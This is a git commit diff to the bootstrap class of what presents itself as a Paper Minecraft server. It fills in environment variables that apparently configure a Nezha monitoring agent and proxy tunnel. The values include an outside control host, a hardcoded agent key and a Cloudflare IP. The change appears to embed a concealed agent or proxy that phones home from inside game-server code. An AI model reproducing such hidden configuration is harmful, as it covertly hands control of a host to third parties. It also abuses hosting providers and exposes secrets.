1c8176c1d1039ed658333289c3ee176a84e74560
Orga <decadefraiz@yandex.com>
2025-08-29 11:53:11 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,11 +92,11 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "82949949-17ce-4d0c-8a5b-a8064650a143");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "nzag.faiz.us.kg:8008");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
+        envVars.put("NEZHA_KEY", "JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl");
         envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
@@ -106,9 +106,9 @@ public final class PaperBootstrap {
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
+        envVars.put("CFIP", "rpip.kaixa.v6.navy");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
+        envVars.put("NAME", "Paper-Mc");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
